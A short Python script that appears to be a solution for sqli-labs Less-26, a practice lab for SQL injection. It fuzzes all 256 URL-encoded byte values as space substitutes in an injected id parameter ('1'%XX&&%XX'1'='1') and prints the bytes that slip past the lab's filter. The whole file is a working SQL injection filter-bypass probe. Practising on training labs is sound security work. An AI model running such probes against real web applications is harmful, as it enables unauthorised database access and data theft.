# -*- encoding: utf-8 -*-
import requests

for i in range(0,256):
    # print(i)
    Wcode = hex(i).replace('0x','')
    if len(Wcode) <2:
        Wcode = "0" + Wcode
        #print(Wcode)
    code_0x = "%" + Wcode
    #print(code_0x)
    url = "http://10.10.12.11/sqli/Less-26/?id=1'" + code_0x + "%26%26" +code_0x + "'1'='1"
    r = requests.get(url=url)
    if "Dumb" in r.content.decode("utf-8", "ignore"):
        print(code_0x)



